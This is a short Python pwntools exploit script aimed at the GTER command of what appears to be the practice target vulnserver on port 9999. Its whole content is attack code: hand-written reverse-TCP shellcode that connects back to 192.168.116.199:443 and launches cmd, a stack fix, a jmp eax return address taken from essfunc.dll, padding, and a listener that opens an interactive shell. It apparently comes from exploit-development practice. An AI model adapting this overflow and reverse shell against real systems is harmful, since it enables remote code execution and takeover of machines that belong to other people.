from pwn import *

#TinyRevTCP : 192.168.116.199:443, WSASocketA()->Connect()->CreateProcessA()
buf = (
"\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x6a"
"\x8b\xab\x71\x31\xc0\xff\xd3\x96\x68\xc0\xa8\x74\xc7\x66\x68\x01"
"\xbb\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\x07"
"\x4a\xab\x71\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1"
"\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1"
"\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04"
"\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51"
"\x52\xbb\x6b\x23\x80\x7c\xff\xd3"
)

# Message=  0x625011b1 : jmp eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: Fa>
jmpeax = p32(0x625011b1)

poc = "GTER "
poc += "AA" 
poc += "\x50\x5c" # fix esp, "push eax; pop esp" - move ESP above shellcode
#poc += "\x83\xEC\x78" # alternative fix esp
#poc += "\x83\xEC\x78"
poc += buf
poc += "A" * ((151 + 5) - len(poc))
poc += jmpeax
poc += "C" * ((6000 + 5) - len(poc))

l = listen(443)

r = remote("192.168.116.178", 9999)
print str(r.recvline())
r.send(poc)
r.close()

l.recvline()
l.interactive()
l.close()
